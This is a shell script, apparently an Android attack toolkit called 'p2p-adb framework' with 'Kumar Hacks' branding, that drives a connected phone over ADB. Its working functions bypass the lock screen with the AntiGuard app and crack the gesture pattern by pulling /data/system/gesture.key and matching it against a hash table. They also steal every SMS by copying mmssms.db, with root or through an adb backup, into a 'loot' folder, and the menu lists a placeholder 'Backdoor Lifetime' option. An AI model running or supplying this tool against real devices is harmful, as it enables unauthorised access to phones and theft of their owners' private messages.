prompt () {
Black="\033[0;30m" # Black
Red="\033[0;31m" # Red
Green="\033[0;32m" # Green
Yellow="\033[0;33m" # Yellow
Blue="\033[0;34m" # Blue
Purple="\033[0;35m" # Purple
Cyan="\033[0;36m" # Cyan
White="\033[0;37m" # White
# Bold
BBlack="\033[1;30m" # Black
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" 
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
none="\033[0m"
bold="\033[1m"
red="\033[0;31m"
LPATH=/sdcard/Lab/kp2p/loot
MPATH=/sdcard/Lab/kp2p/
BBPATH=/data/local/tmp/busybox
LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib:/system/lib64
echo
adb version
echo "\t${BGreen}\e[4m                               ${none}\e[0m"
echo "\t${BGreen}\e[7m*********\e[0m             ${BGreen}\e[7m*********${none}"
echo "\t          ${BGreen}\e[4m\e[0m${bold}Kumar Hacks\e[0m${none}"
echo "\t${BGreen}\e[7m*********\e[0m${BGreen}\\e[4m             ${BGreen}\e[7m*********${none}"
echo "\n\t${BWhite}Welcome to p2p-adb framework!${none}"
echo 
echo "\t${BGreen}Let's break some stuff.${none}"
echo 
#findges () { adb shell "su -c 'cp -R /data/system/gesture.key /sdcard/'" ; rm  $LPATH/gesture.key ; adb pull /sdcard/gesture.key $LPATH/;  echo "\t\t${BGreen}\e[4m            \e[0m" ; echo " ${BGreen} " ; echo "\t\t0    1    2\n" ;echo "\t\t3    4    5\n" ; echo "\t\t6    7    8";  echo "\t\t${BGreen}\e[4m            \e[0m" ; echo "\t${BGreen} Pattern Found :`grep \`hexdump -C  $LPATH/gesture.key | sed 's/00000000//g' | head -n 1 | sed 's/ //g' | sed 's/|.*//g'\` $LPATH/gesture_hash.txt | cut -d' ' -f1`"; echo "${none}" ; }
# find Gesture
findges () { if [ "`isroot`" -gt "1" ] ; then echo Getting Gesture ; adb shell "su -c 'cp -R /data/system/gesture.key /sdcard/'" ; rm  $LPATH/gesture.key ; adb pull /sdcard/gesture.key $LPATH/;  echo "\t\t${BGreen}\e[4m            \e[0m" ; echo " ${BGreen} " ; echo "\t\t0    1    2\n" ;echo "\t\t3    4    5\n" ; echo "\t\t6    7    8";  echo "\t\t${BGreen}\e[4m            \e[0m" ; echo "\t${BGreen} Pattern Found :`grep \` xxd -p $LPATH/gesture.key\` $LPATH/gesture_hash.txt | cut -d' ' -f1`"; echo "${none}" ;else echo "\t${BRed}\e[7mYou are Not Root\e[0m${none}"; fi }
#busy box installation 
bb () { adb push $MPATH/busybox $BBPATH ;adb shell "chmod 777 $BBPATH" ; echo done ; }
#device Status
ds () { if [ `adb devices | grep -c "device$"` -gt 0 ] ; then echo Yes ; else echo no ; fi }
#isroot
isroot () { adb shell 'su -c "ls /data/data/"' | grep . | wc -l ; }
STATUS=`adb shell '/data/local/tmp/busybox' 2>&1 /dev/null` ;
#Steal Messages and Contacts 
rsms () { A=$RANDOM ;LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib; echo -e "${BPurple}\t1) Root \n\t2) Non Root";  echo -n "${BGreen}Choose Method:${none} " ; read user ; case "$user" in 1) if [ "`isroot`" -gt "1" ] ; then adb shell "su -c 'cp -R /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/'" ; adb pull /sdcard/mmssms.db $LPATH/ ;LD_LIBRARY_PATH=/system/lib64 ;sqlite3 $LPATH/mmssms.db "select * from sms" > $LPATH/'khak_Message_'$A ; echo "${BGreen}Messages Stored in $LPATH/khak_Message_$A ${none}"; else echo "\t${BRed}\e[7mYou are Not Root\e[0m${none}" ;fi  ;; 2) adb backup -f $LPATH/backup.ab com.android.providers.telephony && ( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 $LPATH/backup.ab ) | tar xz -C $LPATH/  2>/dev/null && LD_LIBRARY_PATH=/system/lib64 && sqlite3 $LPATH/apps/com.android.providers.telephony/db/mmssms.db "select * from sms;" > $LPATH/'khak_Message_'$A ; rm -rf $LPATH/apps ; echo "${BGreen}Messages Stored in $LPATH/khak_Message_$A ${none}";  ;; esac ; }

	echo "\t${BCyan}What do you want to do today?
	y) Install BusyBox `if [ \`echo $STATUS | wc -l\` -ge 1 ];then BS=no;if [ "\`echo $STATUS | grep -i error |wc -l\`" == "1" ];then echo "${BYellow}Status : ${BRed}\e[7mNot connected\e[0m${BCyan}" ; elif [ "\`echo $STATUS | grep -i applet |wc -l\`" == "1" ] ; then echo "${BYellow}Status : ${BGreen}\e[7mInstalled\e[0m${BCyan}" ;else echo "${BYellow}Status : ${BRed}\e[7mNot Installed\e[0m${BCyan}" ; fi ; else BS=yes; echo "${BYellow}Status : ${BGreen}\e[7mInstalled\e[0m${BCyan}" ; fi`
	0) Install AntiGuard
	1) Unlock the pattern
	2) Uninstall AntiGaurd
	3) Find Gesture
	4) Install Backdoor Lifetime
	5) Steal Messages
	x) Exit${none}
	"
	echo -n "Choose wisely: " 
	read REPLY
if [ `adb devices | grep -c "device$"` -gt 0 ] ; then
	case "$REPLY" in
	0) echo "${BGreen}\e[7mInstalling.\e[0m" && adb install -r /sdcard/Lab/kp2p/AntiGuard.apk;;
	1) echo "${BGreen}\e[7mUnlocking Screen Now ...\e[0m" && adb shell am start -S io.kos.antiguard/.unlock ;;
	2) echo "${BGreen}\e[7mUninstall the AntiGaurd\e[0m" &&  adb uninstall io.kos.antiguard;;
	3) echo "${BGreen}\e[7mCracking Gesture\e[0m" && findges ;;
	4) echo "\t${BYellow}\e[4m\e[7m${bold}Script in Under process${none}";;
	5) rsms ;;
	'y'|'Y') echo "${BGreen}\e[7mInstalling BusyBox ..\e[0m" && bb;; 
	'x'|'X') echo "Goodbye." && exit ;;
	 *) echo "${bold}That's not an answer!${none}\n" &&  prompt ;;
	esac
	echo ""
	prompt
else 
echo "\t ${BRed}Device Not Found ${none}\n" && exit
fi
}
prompt